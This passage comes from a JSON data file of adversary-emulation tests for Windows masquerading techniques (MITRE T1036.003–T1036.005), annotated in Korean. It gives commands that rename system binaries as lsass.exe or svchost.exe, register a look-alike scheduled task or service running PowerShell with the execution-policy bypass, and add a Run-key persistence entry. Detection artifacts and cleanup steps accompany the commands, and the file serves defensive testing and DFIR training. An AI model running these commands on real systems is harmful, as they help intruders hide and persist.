        "복사된 %SystemRoot%\\Temp\\lsass.exe를 /B 옵션으로 실행한다.",
        "일정 시간이 지난 뒤 DFIR 관점에서 프로세스 목록, 이미지 경로, Prefetch 등 아티팩트를 분석해 비정상 LSASS 실행을 확인할 수 있다.",
        "cleanup 단계에서 %SystemRoot%\\Temp\\lsass.exe 파일을 삭제해 흔적을 정리한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B"
        }
      ],
      "prerequisites": [
        "Windows 환경에서 cmd.exe를 실행할 수 있어야 한다.",
        "%SystemRoot%\\System32 경로에 대한 읽기 권한과 %SystemRoot%\\Temp 경로에 대한 쓰기 권한이 필요하다.",
        "일부 EDR/안티바이러스는 Temp 경로에서 lsass.exe 실행을 차단할 수 있으므로, 실험 환경에서는 보안 정책을 고려해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%SystemRoot%\\Temp\\lsass.exe",
            "description": "원본 cmd.exe가 복사되어 LSASS 이름으로 위장된 실행 파일. 비표준 경로의 lsass.exe는 강한 의심 지표이다."
          }
        ],
        "files_read": [
          {
            "path": "%SystemRoot%\\System32\\cmd.exe",
            "description": "정상 시스템 디렉터리에 존재하는 cmd.exe 원본 바이너리"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "lsass.exe",
            "description": "실제 이미지는 cmd.exe이지만 파일명만 lsass.exe인 프로세스. 이미지 경로가 %SystemRoot%\\Temp 인 것이 특징이다.",
            "commandline_pattern": "%SystemRoot%\\Temp\\lsass.exe /B"
          },
          {
            "name": "cmd.exe",
            "description": "copy 및 실행 명령을 수행하는 명령 프롬프트 프로세스",
            "commandline_pattern": "*copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "명령 프롬프트에서 `del /Q /F %SystemRoot%\\Temp\\lsass.exe >nul 2>&1` 를 실행해 위장된 lsass.exe 파일을 삭제한다."
      ],
      "metadata": {
        "atomic_source_id": "5ba5a3d1-cf3c-4499-968a-a93155d1f717"
      }
    },

    {
      "test_id": "T1036.003-2",
      "name": "Masquerading - cscript.exe running as notepad.exe",
      "platforms": ["windows"],
      "summary": "System32의 cscript.exe를 %APPDATA% 경로로 복사하면서 파일명을 notepad.exe로 변경하고 실행한다. 스크립트 호스트가 메모장(notepad.exe)으로 가장해 비표준 경로에서 동작하는 상황을 시뮬레이션한다.",
      "procedure": [
        "%SystemRoot%\\System32\\cscript.exe를 %APPDATA%\\notepad.exe 이름으로 복사한다.",
        "cmd.exe를 통해 %APPDATA%\\notepad.exe /B를 실행해 cscript.exe가 notepad.exe처럼 동작하도록 한다.",
        "프로세스 목록·이미지 경로·PE 메타데이터를 통해 파일 이름과 실제 서명/설명이 불일치하는 점을 확인할 수 있다.",
        "cleanup 단계에서 %APPDATA%\\notepad.exe를 삭제한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "copy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y\ncmd.exe /c %APPDATA%\\notepad.exe /B"
        }
      ],
      "prerequisites": [
        "Windows 환경에서 cmd.exe를 실행할 수 있어야 한다.",
        "%SystemRoot%\\System32에 대한 읽기 권한과 %APPDATA% 경로에 대한 쓰기 권한이 필요하다.",
        "스크립트 실행이 그룹 정책이나 보안 솔루션에 의해 완전히 차단되어 있지 않아야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%APPDATA%\\notepad.exe",
            "description": "cscript.exe를 복사해 이름만 notepad.exe로 변경한 실행 파일. 사용자 프로필 내 비표준 notepad.exe는 위장 의심 대상이다."
          }
        ],
        "files_read": [
          {
            "path": "%SystemRoot%\\System32\\cscript.exe",
            "description": "정상 Windows Script Host 콘솔 버전 실행 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "notepad.exe",
            "description": "%APPDATA% 경로에서 실행되는 notepad.exe 이미지이나, 실제 PE는 cscript.exe이다.",
            "commandline_pattern": "%APPDATA%\\notepad.exe /B"
          },
          {
            "name": "cmd.exe",
            "description": "위장된 notepad.exe(cscript.exe)를 실행하는 명령 프롬프트",
            "commandline_pattern": "cmd.exe /c %APPDATA%\\notepad.exe /B"
          }
        ],
        "network": []
      },
      "cleanup": [
        "`del /Q /F %APPDATA%\\notepad.exe >nul 2>&1` 명령으로 위장 바이너리를 삭제한다."
      ],
      "metadata": {
        "atomic_source_id": "3a2a578b-0a01-46e4-92e3-62e2859b42f0"
      }
    },

    {
      "test_id": "T1036.003-3",
      "name": "Masquerading - wscript.exe running as svchost.exe",
      "platforms": ["windows"],
      "summary": "System32의 wscript.exe를 %APPDATA%\\svchost.exe로 복사한 뒤, 외부 VBS 스크립트를 인자로 실행한다. 서비스 호스트(svchost.exe)처럼 보이지만 실제로는 wscript.exe인 프로세스를 생성해 위장 실행을 재현한다.",
      "procedure": [
        "사전 단계에서 T1036.003_masquerading.vbs를 PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.003\\src 경로에 다운로드한다.",
        "%SystemRoot%\\System32\\wscript.exe를 %APPDATA%\\svchost.exe 이름으로 복사한다.",
        "cmd.exe /c %APPDATA%\\svchost.exe \"...vbs\" 명령으로 위장된 wscript 프로세스를 실행한다.",
        "실행 중 프로세스 이름(svchost.exe), 이미지 경로(%APPDATA%), 원본 PE 메타데이터(마이크로소프트 서명 wscript.exe) 간 불일치를 분석할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y\ncmd.exe /c %APPDATA%\\svchost.exe \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\""
        }
      ],
      "prerequisites": [
        "PowerShell 또는 기타 방법으로 T1036.003_masquerading.vbs가 지정된 ExternalPayloads 경로에 존재해야 한다.",
        "%SystemRoot%\\System32에 대한 읽기 권한과 %APPDATA% 경로에 대한 쓰기 권한이 필요하다.",
        "Windows Script Host(wscript.exe) 실행이 정책에 의해 완전히 비활성화되어 있지 않아야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%APPDATA%\\svchost.exe",
            "description": "wscript.exe를 복사해 서비스 호스트 이름(svchost.exe)으로 변경한 위장 실행 파일"
          }
        ],
        "files_read": [
          {
            "path": "%SystemRoot%\\System32\\wscript.exe",
            "description": "정상 Windows Script Host GUI 버전 실행 파일"
          },
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs",
            "description": "위장된 svchost.exe(wscript.exe)가 실행하는 VBS 스크립트"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "svchost.exe",
            "description": "%APPDATA% 경로에서 실행되는 svchost.exe 프로세스이나, 실제 이미지는 wscript.exe이다.",
            "commandline_pattern": "%APPDATA%\\svchost.exe *T1036.003_masquerading.vbs*"
          },
          {
            "name": "cmd.exe",
            "description": "위장된 svchost.exe(wscript.exe)를 호출하는 명령 프롬프트",
            "commandline_pattern": "cmd.exe /c %APPDATA%\\svchost.exe *"
          }
        ],
        "network": []
      },
      "cleanup": [
        "`del /Q /F %APPDATA%\\svchost.exe >nul 2>&1` 명령으로 위장된 svchost.exe 파일을 삭제한다."
      ],
      "metadata": {
        "atomic_source_id": "24136435-c91a-4ede-9da1-8b284a1c1a23"
      }
    },

    {
      "test_id": "T1036.003-4",
      "name": "Masquerading - powershell.exe running as taskhostw.exe",
      "platforms": ["windows"],
      "summary": "System32의 powershell.exe를 %APPDATA%\\taskhostw.exe로 복사한 뒤 cmd.exe를 통해 실행한다. 태스크 호스트(taskhostw.exe)처럼 보이는 이름과 위치를 사용하지만 실제 PE는 PowerShell인 상황을 만들어 위장을 테스트한다.",
      "procedure": [
        "%windir%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe를 %APPDATA%\\taskhostw.exe로 복사한다.",
        "cmd.exe /K %APPDATA%\\taskhostw.exe 명령으로 위장된 PowerShell 프로세스를 실행한다.",
        "이후 프로세스 목록, 이미지 경로, 커맨드라인을 조사하여 정식 taskhostw.exe(보통 System32)와의 위치 차이를 확인한다.",
        "cleanup 단계에서 %APPDATA%\\taskhostw.exe를 제거한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y\ncmd.exe /K %APPDATA%\\taskhostw.exe"
        }
      ],
      "prerequisites": [
        "Windows PowerShell이 %windir%\\System32\\WindowsPowerShell\\v1.0 경로에 존재해야 한다.",
        "%APPDATA% 경로에 대한 쓰기 권한이 필요하다.",
        "실행 중인 cmd 창은 사용자가 수동으로 닫아야 할 수 있다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%APPDATA%\\taskhostw.exe",
            "description": "powershell.exe를 복사해 이름만 taskhostw.exe로 변경한 실행 파일"
          }
        ],
        "files_read": [
          {
            "path": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "description": "정상 PowerShell 호스트 실행 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "taskhostw.exe",
            "description": "%APPDATA% 경로에서 실행되는 taskhostw.exe 프로세스이지만 실제 이미지는 PowerShell이다.",
            "commandline_pattern": "%APPDATA%\\taskhostw.exe"
          },
          {
            "name": "cmd.exe",
            "description": "taskhostw.exe(위장된 powershell.exe)를 실행하는 명령 프롬프트",
            "commandline_pattern": "cmd.exe /K %APPDATA%\\taskhostw.exe"
          }
        ],
        "network": []
      },
      "cleanup": [
        "`del /Q /F %APPDATA%\\taskhostw.exe >nul 2>&1` 명령으로 파일을 삭제해 위장 실행 흔적을 제거한다."
      ],
      "metadata": {
        "atomic_source_id": "ac9d0fc3-8aa8-4ab5-b11f-682cd63b40aa"
      }
    },

    {
      "test_id": "T1036.003-5",
      "name": "Masquerading - non-windows exe running as windows exe",
      "platforms": ["windows"],
      "summary": "임의의 exe(비 Windows 기본 파일)를 복사해 svchost.exe라는 이름과 TEMP 경로로 배치하고 실행한 뒤 바로 종료한다. 비표준 svchost.exe가 사용자 TEMP 디렉터리에서 실행되는 상황을 만들어 악성 페이로드가 시스템 프로세스를 가장하는 케이스를 모사한다.",
      "procedure": [
        "기본적으로 PathToAtomicsFolder\\T1036.003\\bin\\T1036.003.exe를 입력 파일로 사용한다.",
        "PowerShell에서 copy \"#{inputfile}\" #{outputfile} 명령으로 exe를 #{outputfile} (기본: %TEMP%\\svchost.exe) 경로에 복사한다.",
        "Start-Process -PassThru -FilePath #{outputfile}로 위장된 svchost.exe를 실행하고, 프로세스 ID를 획득한다.",
        "테스트 직후 Stop-Process -ID 로 프로세스를 종료해 짧게 실행된 위장 svchost.exe를 남긴다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "copy \"#{inputfile}\" #{outputfile}\ntry { $myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id }\ncatch { $_; exit $_.Exception.HResult}\nStop-Process -ID $myT1036_003"
        }
      ],
      "prerequisites": [
        "PathToAtomicsFolder\\T1036.003\\bin\\T1036.003.exe 또는 사용자 지정 inputfile 경로에 실행 가능한 PE 파일이 존재해야 한다.",
        "TEMP 디렉터리(#{outputfile} 기본 경로)에 쓰기 및 실행 권한이 필요하다.",
        "보안 솔루션이 TEMP 경로의 svchost.exe 실행을 차단할 수 있으므로, 실험 환경을 고려해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\svchost.exe",
            "description": "사용자 TEMP 디렉터리에 생성된 위장 svchost.exe. 실제로는 임의의 테스트 바이너리(T1036.003.exe)이다."
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1036.003\\bin\\T1036.003.exe",
            "description": "복사 대상이 되는 비 Windows 기본 exe 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "svchost.exe",
            "description": "이미지 경로가 %TEMP%인 비정상 svchost.exe 프로세스",
            "commandline_pattern": "%TEMP%\\svchost.exe"
          },
          {
            "name": "powershell.exe",
            "description": "복사 및 프로세스 생성·종료를 담당하는 PowerShell 프로세스",
            "commandline_pattern": "*copy*#{inputfile}*#{outputfile}*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "PowerShell에서 `Remove-Item #{outputfile} -Force -ErrorAction Ignore`를 실행해 TEMP의 svchost.exe를 삭제한다."
      ],
      "metadata": {
        "atomic_source_id": "bc15c13f-d121-4b1f-8c7d-28d95854d086"
      }
    },

    {
      "test_id": "T1036.003-6",
      "name": "Masquerading - windows exe running as different windows exe",
      "platforms": ["windows"],
      "summary": "환경 변수 %ComSpec%(일반적으로 cmd.exe)를 복사해 svchost.exe라는 이름으로 TEMP 디렉터리에 저장하고 실행한 뒤 종료한다. 정상 Windows 실행 파일을 다른 시스템 프로세스 이름으로 위장하는 패턴을 재현한다.",
      "procedure": [
        "입력 파일로 $env:ComSpec (대부분 C:\\Windows\\System32\\cmd.exe)을 사용한다.",
        "PowerShell에서 copy \"#{inputfile}\" #{outputfile} 명령으로 exe를 #{outputfile}(기본: %TEMP%\\svchost.exe)로 복사한다.",
        "Start-Process -PassThru -FilePath #{outputfile}로 TEMP\\svchost.exe를 실행하고, 프로세스 ID를 저장한다.",
        "Stop-Process -ID 를 사용해 프로세스를 즉시 종료하면서도, 짧게 실행된 위장 svchost.exe 흔적(로그, Prefetch 등)을 남긴다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "copy \"#{inputfile}\" #{outputfile}\n$myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036_003"
        }
      ],
      "prerequisites": [
        "환경 변수 %ComSpec%가 유효한 Windows 실행 파일(cmd.exe) 경로를 가리켜야 한다.",
        "TEMP 디렉터리에 대한 쓰기·실행 권한이 필요하다.",
        "프로세스 생성과 종료가 보안 솔루션에 의해 전면 차단되지 않아야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\svchost.exe",
            "description": "cmd.exe를 복사해 이름만 svchost.exe로 변경한 실행 파일"
          }
        ],
        "files_read": [
          {
            "path": "%ComSpec%",
            "description": "보통 C:\\Windows\\System32\\cmd.exe 경로를 가리키는 환경 변수"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "svchost.exe",
            "description": "이미지 경로가 TEMP인 비정상 svchost.exe 프로세스(실제 PE는 cmd.exe)",
            "commandline_pattern": "%TEMP%\\svchost.exe"
          },
          {
            "name": "powershell.exe",
            "description": "복사·실행·종료를 수행하는 스크립트 런처",
            "commandline_pattern": "*copy*#{inputfile}*#{outputfile}*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "PowerShell에서 `Remove-Item #{outputfile} -Force -ErrorAction Ignore` 명령을 실행하여 TEMP의 svchost.exe 파일을 제거한다."
      ],
      "metadata": {
        "atomic_source_id": "c3d24a39-2bfe-4c6a-b064-90cd73896cb0"
      }
    },

    {
      "test_id": "T1036.003-7",
      "name": "Malicious process Masquerading as LSM.exe",
      "platforms": ["windows"],
      "summary": "System32의 cmd.exe를 C:\\lsm.exe라는 이름으로 루트 디렉터리에 복사하고, C:\\T1036.003.txt 파일을 생성하는 명령을 실행한다. LSM(Local Session Manager) 시스템 서비스처럼 보이는 프로세스/파일을 비표준 경로와 잘못된 계정으로 실행하는 사례를 모사한다.",
      "procedure": [
        "C:\\Windows\\System32\\cmd.exe를 C:\\lsm.exe 이름으로 복사한다.",
        "C:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt 명령을 실행해 텍스트 파일을 생성한다.",
        "DFIR 관점에서 C:\\lsm.exe의 경로, 파일 서명, 실행 계정을 점검해 정상 LSM 서비스(보통 %SystemRoot%\\System32\\lsm.exe, Local System 계정)와의 차이를 비교할 수 있다.",
        "cleanup 단계에서 C:\\T1036.003.txt와 C:\\lsm.exe를 삭제하여 환경을 원복한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe\nC:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt"
        }
      ],
      "prerequisites": [
        "관리자 권한(elevation_required: true)이 필요하다. 루트 드라이브(C:\\)에 실행 파일을 생성하기 위해 권한이 요구된다.",
        "C:\\Windows\\System32\\cmd.exe에 대한 읽기 권한이 있어야 한다.",
        "보안 솔루션에 따라 C:\\lsm.exe 실행이 차단될 수 있으므로, 실험 전 정책을 확인해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "C:\\lsm.exe",
            "description": "cmd.exe를 복사해 이름만 lsm.exe로 변경한 위장 실행 파일. 정상 LSM 경로가 아니므로 강한 이상 징후이다."
          },
          {
            "path": "C:\\T1036.003.txt",
            "description": "위장된 lsm.exe(cmd.exe) 실행 결과로 생성되는 테스트 텍스트 파일"
          }
        ],
        "files_read": [
          {
            "path": "C:\\Windows\\System32\\cmd.exe",
            "description": "정상 cmd.exe 원본 실행 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "lsm.exe",
            "description": "경로가 C:\\ 인 비정상 LSM 프로세스(실제 이미지는 cmd.exe)",
            "commandline_pattern": "C:\\lsm.exe /c echo T1036.003*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "`del C:\\T1036.003.txt >nul 2>&1` 명령으로 텍스트 파일을 제거한다.",
        "`del C:\\lsm.exe >nul 2>&1` 명령으로 위장된 lsm.exe를 삭제한다."
      ],
      "metadata": {
        "atomic_source_id": "83810c46-f45e-4485-9ab6-8ed0e9e6ed7f"
      }
    }
  ]
},
{
  "technique_id": "T1036.004",
  "technique_name": "Masquerading: Masquerade Task or Service",
  "tactic": "Defense Evasion",
  "description": "정상 서비스/작업과 이름이 유사한 스케줄러 태스크나 Windows 서비스(win32times 등)를 새로 만들어, 합법적인 구성 요소처럼 보이게 위장하는 기법이다. 공격자는 SYSTEM 계정으로 스케줄러를 등록하거나 서비스 컨트롤 매니저(SCM)에 유사 명칭 서비스를 추가해 지속성 및 실행 경로를 숨긴다. DFIR에서는 작업 스케줄러 항목, 서비스 레지스트리 키, 실행 명령과 실제 바이너리 존재 여부를 함께 확인하는 것이 중요하다.",

  "tests": [
    {
      "test_id": "T1036.004-1",
      "name": "Creating W32Time-similar scheduled task using schtasks",
      "platforms": ["windows"],
      "summary": "schtasks 명령을 사용해 실제 W32Time 서비스와 유사한 이름(win32times)의 스케줄러 태스크를 생성한다. 태스크는 SYSTEM 계정으로 매일 실행되며, 존재하지 않는 PowerShell 스크립트를 호출하도록 설정되어 위장된 태스크 기반 지속성 시나리오를 모사한다.",
      "procedure": [
        "schtasks /create 명령으로 /tn win32times 이름의 새 스케줄러 태스크를 생성한다.",
        "태스크는 /ru system 으로 SYSTEM 계정, /sc daily로 매일 주기 실행, /tr \"cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1\" 명령을 수행하도록 설정한다.",
        "schtasks /query /tn win32times 를 통해 태스크가 정상적으로 등록되었는지 확인한다.",
        "cleanup 단계에서 schtasks /tn win32times /delete /f 명령으로 해당 태스크를 제거한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "schtasks /create /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1\" /tn win32times /f\nschtasks /query /tn win32times"
        }
      ],
      "prerequisites": [
        "관리자 권한이 필요하며, schtasks.exe 사용이 허용된 Windows 환경이어야 한다.",
        "작업 스케줄러 서비스(Task Scheduler)가 정상 동작 중이어야 한다.",
        "테스트 명령은 존재하지 않는 c:\\T1036.004_NonExistingScript.ps1를 호출하므로 실제 악성 스크립트 없이도 위장된 태스크 구조만 재현한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "C:\\Windows\\System32\\Tasks\\win32times",
            "description": "Task Scheduler에 의해 생성되는 win32times 스케줄러 태스크 정의 파일(경로/이름은 OS 버전에 따라 약간 다를 수 있음)."
          }
        ],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\win32times",
            "description": "win32times 스케줄 태스크 등록 정보를 포함하는 레지스트리 키(유사 W32Time 명칭으로 위장된 태스크)."
          }
        ],
        "processes": [
          {
            "name": "schtasks.exe",
            "description": "win32times 태스크를 생성하고 조회하는 작업 스케줄러 CLI 프로세스",
            "commandline_pattern": "schtasks /create* /tn win32times*"
          },
          {
            "name": "cmd.exe",
            "description": "태스크 동작 시 호출될 명령 인터프리터(테스트에서는 실제 실행까지는 이루어지지 않을 수 있음).",
            "commandline_pattern": "cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1"
          },
          {
            "name": "powershell.exe",
            "description": "태스크 동작 시 우회 실행 정책(-ep bypass)과 함께 스크립트를 실행하도록 설정된 PowerShell 프로세스.",
            "commandline_pattern": "powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1"
          }
        ],
        "network": []
      },
      "cleanup": [
        "명령 프롬프트에서 `schtasks /tn win32times /delete /f` 를 실행해 win32times 스케줄러 태스크를 삭제한다.",
        "Task Scheduler 관련 캐시/로그(Event ID 4698, 4702 등)는 필요 시 별도 DFIR 분석 후 정리한다."
      ],
      "metadata": {
        "atomic_source_id": "f9f2fe59-96f7-4a7d-ba9f-a9783200d4c9"
      }
    },

    {
      "test_id": "T1036.004-2",
      "name": "Creating W32Time-similar service using sc",
      "platforms": ["windows"],
      "summary": "sc 명령을 이용해 실제 W32Time 서비스와 유사한 이름(win32times)의 Windows 서비스를 생성한다. 서비스 binPath는 cmd /c start c:\\T1036.004_NonExistingScript.ps1 로 설정되어, 마치 정상 시간 서비스처럼 보이는 위장된 사용자 정의 서비스를 재현한다.",
      "procedure": [
        "sc create win32times binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\" 명령으로 새 서비스를 생성한다.",
        "sc qc win32times 를 실행해 서비스 구성이 어떻게 등록되었는지 확인한다.",
        "서비스는 실제 W32Time(Windows Time)과 유사한 이름(win32times)을 사용해, 관리 콘솔이나 로그에서 혼동을 유발할 수 있다.",
        "cleanup 단계에서 sc delete win32times 명령으로 서비스를 제거한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "sc create win32times binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\"\nsc qc win32times"
        }
      ],
      "prerequisites": [
        "서비스 생성에는 관리자 권한이 필요하다.",
        "서비스 제어 관리자(SCM)가 동작 중인 Windows 환경이어야 한다.",
        "테스트에서 지정한 c:\\T1036.004_NonExistingScript.ps1 는 실제로 존재하지 않아도 되며, 주 목적은 위장 서비스 등록 자체를 재현하는 것이다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\win32times",
            "description": "win32times 서비스 설정 정보(이미지 경로, 시작 유형 등)를 저장하는 서비스 레지스트리 키."
          }
        ],
        "processes": [
          {
            "name": "sc.exe",
            "description": "서비스 생성 및 구성 조회(sc create, sc qc)를 수행하는 Service Controller CLI 프로세스",
            "commandline_pattern": "sc create win32times*"
          },
          {
            "name": "cmd.exe",
            "description": "서비스가 실제로 시작될 경우 실행하는 명령 인터프리터. binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\" 로 등록됨.",
            "commandline_pattern": "cmd /c start c:\\T1036.004_NonExistingScript.ps1"
          }
        ],
        "network": []
      },
      "cleanup": [
        "`sc delete win32times` 명령으로 서비스 레지스트리 키와 SCM 등록을 제거한다.",
        "서비스가 실제로 시작되었다면, 관련 이벤트 로그(System 채널의 Service Control Manager 이벤트 등)를 DFIR 목적으로 보존 또는 분석 후 정리할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "b721c6ef-472c-4263-a0d9-37f1f4ecff66"
      }
    }
  ]
},
{
  "technique_id": "T1036.005",
  "technique_name": "Masquerading: Match Legitimate Name or Location",
  "tactic": "Defense Evasion",
  "description": "정상 시스템 유틸리티와 동일하거나 매우 유사한 이름·경로를 사용해 악성 실행 파일을 배치·실행하는 위장 기법이다. 공격자는 svchost.exe, lsass.exe 등 신뢰받는 프로세스 이름이나 일반적으로 사용되는 폴더(예: Temp, Program Files 등)를 악용해 탐지 규칙을 우회한다. DFIR에서는 이미지 경로, 서명 정보, 해시, 부모 프로세스, 레지스트리 Run 키 등을 함께 분석해 실제 합법 바이너리인지 여부를 구분해야 한다.",

  "tests": [
    {
      "test_id": "T1036.005-1",
      "name": "Masquerade as a built-in system executable",
      "platforms": ["windows"],
      "summary": "PowerShell Add-Type를 이용해 간단한 C# 프로그램을 컴파일하고, 출력 파일명을 svchost.exe와 같이 정상 시스템 유틸리티 이름으로 지정한다. 이후 해당 파일을 실행해, Temp 경로에 위치한 가짜 svchost.exe 프로세스가 떠 있는 상황을 재현한다.",
      "procedure": [
        "PowerShell Add-Type -TypeDefinition을 사용해 콘솔에 \"tweet, tweet\" 문자열을 출력하는 단순 C# Main 함수를 정의한다.",
        "Add-Type 호출 시 -OutputAssembly 파라미터를 이용해 출력 경로를 #{executable_filepath} (기본: %windir%\\Temp\\svchost.exe)로 지정해 컴파일한다.",
        "Start-Process -FilePath \"#{executable_filepath}\" 명령으로 Temp 폴더의 svchost.exe를 실행한다.",
        "cleanup 단계에서 Remove-Item -Path \"#{executable_filepath}\"로 생성된 가짜 svchost.exe 파일을 삭제한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Add-Type -TypeDefinition @'\n      public class Test {\n          public static void Main(string[] args) {\n              System.Console.WriteLine(\"tweet, tweet\");\n          }\n      }\n      '@ -OutputAssembly \"#{executable_filepath}\"\n\n      Start-Process -FilePath \"#{executable_filepath}\""
        }
      ],
      "prerequisites": [
        "해당 시스템에 .NET 및 PowerShell Add-Type 기능이 사용 가능해야 한다.",
        "기본 경로인 %windir%\\Temp 에 파일을 생성할 수 있는 권한이 있어야 한다.",
        "동일 이름의 svchost.exe가 Temp 경로에 이미 존재하지 않는 것이 이상적이며, 존재하는 경우 덮어쓰기가 발생할 수 있다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%windir%\\Temp\\svchost.exe",
            "description": "정상 시스템 유틸리티 svchost.exe 이름을 사용해 Temp 폴더에 생성된 사용자 정의 .NET 실행 파일."
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "svchost.exe",
            "description": "Temp 디렉터리(%windir%\\Temp\\svchost.exe)에서 실행된 가짜 svchost 프로세스.",
            "commandline_pattern": "%windir%\\Temp\\svchost.exe"
          },
          {
            "name": "powershell.exe",
            "description": "Add-Type를 통해 C# 코드를 컴파일하고 Start-Process로 가짜 svchost.exe를 실행한 PowerShell 프로세스.",
            "commandline_pattern": "Add-Type* -OutputAssembly*svchost.exe*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "PowerShell에서 `Remove-Item -Path \"#{executable_filepath}\" -ErrorAction Ignore` 명령을 실행해 Temp 폴더의 svchost.exe 파일을 삭제한다.",
        "실행 중인 가짜 svchost.exe 프로세스가 남아 있다면 작업 관리자나 DFIR 도구를 통해 수동으로 종료해도 된다."
      ],
      "metadata": {
        "atomic_source_id": "35eb8d16-9820-4423-a2a1-90c4f5edd9ca"
      }
    },

    {
      "test_id": "T1036.005-2",
      "name": "Masquerading cmd.exe as VEDetector.exe",
      "platforms": ["windows"],
      "summary": "정상 cmd.exe를 복사해 VEDetector.exe라는 합법 프로그램처럼 보이는 이름으로 변경한 뒤, HKLM Run 레지스트리 키에 등록해 지속성과 위장을 동시에 구현한다. 이후 VEDetector.exe를 실행하고, 프로세스·레지스트리 기반 탐지 시나리오를 모사한다.",
      "procedure": [
        "입력 인자 source_file (기본: %SystemRoot%\\System32\\cmd.exe)가 실제로 존재하는지 Test-Path로 확인한다.",
        "Copy-Item을 사용해 cmd.exe를 #{ved_path}\\VEDetector.exe 경로로 복사·이름 변경한다.",
        "New-ItemProperty를 사용해 HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 아래에 \"VEDetector\" 값을 생성하고, 값 데이터로 #{ved_path}\\VEDetector.exe 경로를 설정해 부팅 시 자동 실행되도록 구성한다.",
        "Start-Process -FilePath \"#{ved_path}\\VEDetector.exe\" 로 위장된 실행 파일을 시작하고 약 5초간 대기한다.",
        "cleanup 단계에서 Run 키를 제거하고, 실행 중인 VEDetector 프로세스를 중지한 뒤, VEDetector.exe 파일을 삭제한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "# Copy and rename cmd.exe to VEDetector.exe\nCopy-Item -Path \"#{source_file}\" -Destination \"#{ved_path}\\VEDetector.exe\" -Force\n\n# Create registry run key for persistence\nNew-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"VEDetector\" -Value \"#{ved_path}\\VEDetector.exe\" -PropertyType String -Force\n\n# Start the renamed process\nStart-Process -FilePath \"#{ved_path}\\VEDetector.exe\"\n\nStart-Sleep -Seconds 5"
        }
      ],
      "prerequisites": [
        "관리자 권한(레지스트리 HKLM Run 키 수정 및 프로그램 복사에 필요)이 있어야 한다.",
